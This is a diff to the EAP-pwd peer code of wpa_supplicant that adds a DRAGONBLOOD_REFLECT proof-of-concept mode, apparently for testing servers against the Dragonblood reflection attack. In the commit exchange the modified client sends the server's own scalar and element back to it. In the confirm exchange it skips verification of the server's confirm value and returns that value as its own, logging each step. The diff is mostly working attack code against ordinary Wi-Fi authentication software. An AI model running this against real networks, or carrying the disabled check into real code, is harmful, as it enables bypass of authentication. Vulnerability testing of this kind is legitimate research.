@@ -550,7 +550,7 @@ eap_pwd_perform_commit_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 			   "for curve");
 		goto fin;
 	}
-
+	// ==================================================================================================> SCALAR GENERATION
 	if (crypto_bignum_rand(data->private_value,
 			       crypto_ec_get_order(data->grp->group)) < 0 ||
 	    crypto_bignum_rand(mask,
@@ -604,7 +604,7 @@ eap_pwd_perform_commit_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 			   "fail");
 		goto fin;
 	}
-
+	// ==================================================================================================> PEER ELEMENT
 	/* element, x then y, followed by scalar */
 	data->server_element = crypto_ec_point_from_bin(data->grp->group, ptr);
 	if (!data->server_element) {
@@ -613,6 +613,7 @@ eap_pwd_perform_commit_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 		goto fin;
 	}
 	ptr += prime_len * 2;
+	// ==================================================================================================> PEER SCALAR
 	data->server_scalar = crypto_bignum_init_set(ptr, order_len);
 	if (!data->server_scalar) {
 		wpa_printf(MSG_INFO,
@@ -714,6 +715,15 @@ eap_pwd_perform_commit_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 		exit(1);
 	}
 	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "sending generator of small subgroup as the element\n");
+#elif defined(DRAGONBLOOD_REFLECT)
+	crypto_bignum_to_bin(data->server_scalar, scalar, order_len, order_len);
+	if (crypto_ec_point_to_bin(data->grp->group, data->server_element, element,
+				   element + prime_len) != 0) {
+		wpa_printf(MSG_INFO, "EAP-PWD (peer): point assignment fail");
+		goto fin;
+	}
+
+	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "Reflected server scalar and element in commit frame\n");
 #endif // DRAGONBLOOD_INVALID_CUVE
 
 	/* we send the element as (x,y) follwed by the scalar */
@@ -734,185 +744,8 @@ fin:
 }
 
 
-#ifndef DRAGONBLOOD_INVALID_CUVE
-static void
-eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
-				 struct eap_method_ret *ret,
-				 const struct wpabuf *reqData,
-				 const u8 *payload, size_t payload_len)
-{
-	struct crypto_hash *hash = NULL;
-	u32 cs;
-	u16 grp;
-	u8 conf[SHA256_MAC_LEN], *cruft = NULL, *ptr;
-	size_t prime_len = 0, order_len = 0;
+#ifdef DRAGONBLOOD_INVALID_CUVE
 
-	if (data->state != PWD_Confirm_Req) {
-		ret->ignore = TRUE;
-		goto fin;
-	}
-
-	if (payload_len != SHA256_MAC_LEN) {
-		wpa_printf(MSG_INFO,
-			   "EAP-pwd: Unexpected Confirm payload length %u (expected %u)",
-			   (unsigned int) payload_len, SHA256_MAC_LEN);
-		goto fin;
-	}
-
-	prime_len = crypto_ec_prime_len(data->grp->group);
-	order_len = crypto_ec_order_len(data->grp->group);
-
-	/*
-	 * first build up the ciphersuite which is group | random_function |
-	 *	prf
-	 */
-	grp = htons(data->group_num);
-	ptr = (u8 *) &cs;
-	os_memcpy(ptr, &grp, sizeof(u16));
-	ptr += sizeof(u16);
-	*ptr = EAP_PWD_DEFAULT_RAND_FUNC;
-	ptr += sizeof(u8);
-	*ptr = EAP_PWD_DEFAULT_PRF;
-
-	/* each component of the point will be at most as big as the prime */
-	cruft = os_malloc(prime_len * 2);
-	if (!cruft) {
-		wpa_printf(MSG_INFO, "EAP-PWD (server): confirm allocation "
-			   "fail");
-		goto fin;
-	}
-
-	/*
-	 * server's commit is H(k | server_element | server_scalar |
-	 *			peer_element | peer_scalar | ciphersuite)
-	 */
-	hash = eap_pwd_h_init();
-	if (hash == NULL)
-		goto fin;
-
-	/*
-	 * zero the memory each time because this is mod prime math and some
-	 * value may start with a few zeros and the previous one did not.
-	 */
-	crypto_bignum_to_bin(data->k, cruft, prime_len, prime_len);
-	eap_pwd_h_update(hash, cruft, prime_len);
-
-	/* server element: x, y */
-	if (crypto_ec_point_to_bin(data->grp->group, data->server_element,
-				   cruft, cruft + prime_len) != 0) {
-		wpa_printf(MSG_INFO, "EAP-PWD (server): confirm point "
-			   "assignment fail");
-		goto fin;
-	}
-	eap_pwd_h_update(hash, cruft, prime_len * 2);
-
-	/* server scalar */
-	crypto_bignum_to_bin(data->server_scalar, cruft, order_len, order_len);
-	eap_pwd_h_update(hash, cruft, order_len);
-
-	/* my element: x, y */
-	if (crypto_ec_point_to_bin(data->grp->group, data->my_element, cruft,
-				   cruft + prime_len) != 0) {
-		wpa_printf(MSG_INFO, "EAP-PWD (server): confirm point "
-			   "assignment fail");
-		goto fin;
-	}
-	eap_pwd_h_update(hash, cruft, prime_len * 2);
-
-	/* my scalar */
-	crypto_bignum_to_bin(data->my_scalar, cruft, order_len, order_len);
-	eap_pwd_h_update(hash, cruft, order_len);
-
-	/* the ciphersuite */
-	eap_pwd_h_update(hash, (u8 *) &cs, sizeof(u32));
-
-	/* random function fin */
-	eap_pwd_h_final(hash, conf);
-	hash = NULL;
-
-	ptr = (u8 *) payload;
-	if (os_memcmp_const(conf, ptr, SHA256_MAC_LEN)) {
-		wpa_printf(MSG_INFO, "EAP-PWD (peer): confirm did not verify");
-		goto fin;
-	}
-
-	wpa_printf(MSG_DEBUG, "EAP-pwd (peer): confirm verified");
-
-	/*
-	 * compute confirm:
-	 *  H(k | peer_element | peer_scalar | server_element | server_scalar |
-	 *    ciphersuite)
-	 */
-	hash = eap_pwd_h_init();
-	if (hash == NULL)
-		goto fin;
-
-	/* k */
-	crypto_bignum_to_bin(data->k, cruft, prime_len, prime_len);
-	eap_pwd_h_update(hash, cruft, prime_len);
-
-	/* my element */
-	if (crypto_ec_point_to_bin(data->grp->group, data->my_element, cruft,
-				   cruft + prime_len) != 0) {
-		wpa_printf(MSG_INFO, "EAP-PWD (peer): confirm point "
-			   "assignment fail");
-		goto fin;
-	}
-	eap_pwd_h_update(hash, cruft, prime_len * 2);
-
-	/* my scalar */
-	crypto_bignum_to_bin(data->my_scalar, cruft, order_len, order_len);
-	eap_pwd_h_update(hash, cruft, order_len);
-
-	/* server element: x, y */
-	if (crypto_ec_point_to_bin(data->grp->group, data->server_element,
-				   cruft, cruft + prime_len) != 0) {
-		wpa_printf(MSG_INFO, "EAP-PWD (peer): confirm point "
-			   "assignment fail");
-		goto fin;
-	}
-	eap_pwd_h_update(hash, cruft, prime_len * 2);
-
-	/* server scalar */
-	crypto_bignum_to_bin(data->server_scalar, cruft, order_len, order_len);
-	eap_pwd_h_update(hash, cruft, order_len);
-
-	/* the ciphersuite */
-	eap_pwd_h_update(hash, (u8 *) &cs, sizeof(u32));
-
-	/* all done */
-	eap_pwd_h_final(hash, conf);
-	hash = NULL;
-
-	if (compute_keys(data->grp, data->k,
-			 data->my_scalar, data->server_scalar, conf, ptr,
-			 &cs, data->msk, data->emsk, data->session_id) < 0) {
-		wpa_printf(MSG_INFO, "EAP-PWD (peer): unable to compute MSK | "
-			   "EMSK");
-		goto fin;
-	}
-
-	data->outbuf = wpabuf_alloc(SHA256_MAC_LEN);
-	if (data->outbuf == NULL)
-		goto fin;
-
-	wpabuf_put_data(data->outbuf, conf, SHA256_MAC_LEN);
-
-fin:
-	bin_clear_free(cruft, prime_len * 2);
-	if (data->outbuf == NULL) {
-		ret->methodState = METHOD_DONE;
-		ret->decision = DECISION_FAIL;
-		eap_pwd_state(data, FAILURE);
-	} else {
-		eap_pwd_state(data, SUCCESS_ON_FRAG_COMPLETION);
-	}
-
-	/* clean allocated memory */
-	if (hash)
-		eap_pwd_h_final(hash, conf);
-}
-#else
 static void
 eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 				 struct eap_method_ret *ret,
@@ -1114,6 +947,195 @@ eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 	data->outbuf = wpabuf_alloc(SHA256_MAC_LEN);
 	if (data->outbuf == NULL)
 		goto fin;
+
+	wpabuf_put_data(data->outbuf, conf, SHA256_MAC_LEN);
+
+fin:
+	bin_clear_free(cruft, prime_len * 2);
+	if (data->outbuf == NULL) {
+		ret->methodState = METHOD_DONE;
+		ret->decision = DECISION_FAIL;
+		eap_pwd_state(data, FAILURE);
+	} else {
+		eap_pwd_state(data, SUCCESS_ON_FRAG_COMPLETION);
+	}
+
+	/* clean allocated memory */
+	if (hash)
+		eap_pwd_h_final(hash, conf);
+}
+
+#else
+
+static void
+eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
+				 struct eap_method_ret *ret,
+				 const struct wpabuf *reqData,
+				 const u8 *payload, size_t payload_len)
+{
+	struct crypto_hash *hash = NULL;
+	u32 cs;
+	u16 grp;
+	u8 conf[SHA256_MAC_LEN], *cruft = NULL, *ptr;
+	size_t prime_len = 0, order_len = 0;
+
+	if (data->state != PWD_Confirm_Req) {
+		ret->ignore = TRUE;
+		goto fin;
+	}
+
+	if (payload_len != SHA256_MAC_LEN) {
+		wpa_printf(MSG_INFO,
+			   "EAP-pwd: Unexpected Confirm payload length %u (expected %u)",
+			   (unsigned int) payload_len, SHA256_MAC_LEN);
+		goto fin;
+	}
+
+	prime_len = crypto_ec_prime_len(data->grp->group);
+	order_len = crypto_ec_order_len(data->grp->group);
+
+	/*
+	 * first build up the ciphersuite which is group | random_function |
+	 *	prf
+	 */
+	grp = htons(data->group_num);
+	ptr = (u8 *) &cs;
+	os_memcpy(ptr, &grp, sizeof(u16));
+	ptr += sizeof(u16);
+	*ptr = EAP_PWD_DEFAULT_RAND_FUNC;
+	ptr += sizeof(u8);
+	*ptr = EAP_PWD_DEFAULT_PRF;
+
+	/* each component of the point will be at most as big as the prime */
+	cruft = os_malloc(prime_len * 2);
+	if (!cruft) {
+		wpa_printf(MSG_INFO, "EAP-PWD (server): confirm allocation "
+			   "fail");
+		goto fin;
+	}
+
+	/*
+	 * server's commit is H(k | server_element | server_scalar |
+	 *			peer_element | peer_scalar | ciphersuite)
+	 */
+	hash = eap_pwd_h_init();
+	if (hash == NULL)
+		goto fin;
+
+	/*
+	 * zero the memory each time because this is mod prime math and some
+	 * value may start with a few zeros and the previous one did not.
+	 */
+	crypto_bignum_to_bin(data->k, cruft, prime_len, prime_len);
+	eap_pwd_h_update(hash, cruft, prime_len);
+
+	/* server element: x, y */
+	if (crypto_ec_point_to_bin(data->grp->group, data->server_element,
+				   cruft, cruft + prime_len) != 0) {
+		wpa_printf(MSG_INFO, "EAP-PWD (server): confirm point "
+			   "assignment fail");
+		goto fin;
+	}
+	eap_pwd_h_update(hash, cruft, prime_len * 2);
+
+	/* server scalar */
+	crypto_bignum_to_bin(data->server_scalar, cruft, order_len, order_len);
+	eap_pwd_h_update(hash, cruft, order_len);
+
+	/* my element: x, y */
+	if (crypto_ec_point_to_bin(data->grp->group, data->my_element, cruft,
+				   cruft + prime_len) != 0) {
+		wpa_printf(MSG_INFO, "EAP-PWD (server): confirm point "
+			   "assignment fail");
+		goto fin;
+	}
+	eap_pwd_h_update(hash, cruft, prime_len * 2);
+
+	/* my scalar */
+	crypto_bignum_to_bin(data->my_scalar, cruft, order_len, order_len);
+	eap_pwd_h_update(hash, cruft, order_len);
+
+	/* the ciphersuite */
+	eap_pwd_h_update(hash, (u8 *) &cs, sizeof(u32));
+
+	/* random function fin */
+	eap_pwd_h_final(hash, conf);
+	hash = NULL;
+
+	ptr = (u8 *) payload;
+#ifdef DRAGONBLOOD_REFLECT
+	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "Skipping verification of recieved confirm value\n");
+#else
+	if (os_memcmp_const(conf, ptr, SHA256_MAC_LEN)) {
+		wpa_printf(MSG_INFO, "EAP-PWD (peer): confirm did not verify");
+		goto fin;
+	}
+
+	wpa_printf(MSG_DEBUG, "EAP-pwd (peer): confirm verified");
+#endif
+
+	/*
+	 * compute confirm:
+	 *  H(k | peer_element | peer_scalar | server_element | server_scalar |
+	 *    ciphersuite)
+	 */
+	hash = eap_pwd_h_init();
+	if (hash == NULL)
+		goto fin;
+
+	/* k */
+	crypto_bignum_to_bin(data->k, cruft, prime_len, prime_len);
+	eap_pwd_h_update(hash, cruft, prime_len);
+
+	/* my element */
+	if (crypto_ec_point_to_bin(data->grp->group, data->my_element, cruft,
+				   cruft + prime_len) != 0) {
+		wpa_printf(MSG_INFO, "EAP-PWD (peer): confirm point "
+			   "assignment fail");
+		goto fin;
+	}
+	eap_pwd_h_update(hash, cruft, prime_len * 2);
+
+	/* my scalar */
+	crypto_bignum_to_bin(data->my_scalar, cruft, order_len, order_len);
+	eap_pwd_h_update(hash, cruft, order_len);
+
+	/* server element: x, y */
+	if (crypto_ec_point_to_bin(data->grp->group, data->server_element,
+				   cruft, cruft + prime_len) != 0) {
+		wpa_printf(MSG_INFO, "EAP-PWD (peer): confirm point "
+			   "assignment fail");
+		goto fin;
+	}
+	eap_pwd_h_update(hash, cruft, prime_len * 2);
+
+	/* server scalar */
+	crypto_bignum_to_bin(data->server_scalar, cruft, order_len, order_len);
+	eap_pwd_h_update(hash, cruft, order_len);
+
+	/* the ciphersuite */
+	eap_pwd_h_update(hash, (u8 *) &cs, sizeof(u32));
+
+	/* all done */
+	eap_pwd_h_final(hash, conf);
+	hash = NULL;
+
+	if (compute_keys(data->grp, data->k,
+			 data->my_scalar, data->server_scalar, conf, ptr,
+			 &cs, data->msk, data->emsk, data->session_id) < 0) {
+		wpa_printf(MSG_INFO, "EAP-PWD (peer): unable to compute MSK | "
+			   "EMSK");
+		goto fin;
+	}
+
+	data->outbuf = wpabuf_alloc(SHA256_MAC_LEN);
+	if (data->outbuf == NULL)
+		goto fin;
+
+#ifdef DRAGONBLOOD_REFLECT
+	memcpy(conf, ptr, SHA256_MAC_LEN);
+	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "Reflected confirm value in confirm frame\n");
+#endif
 
 	wpabuf_put_data(data->outbuf, conf, SHA256_MAC_LEN);
 
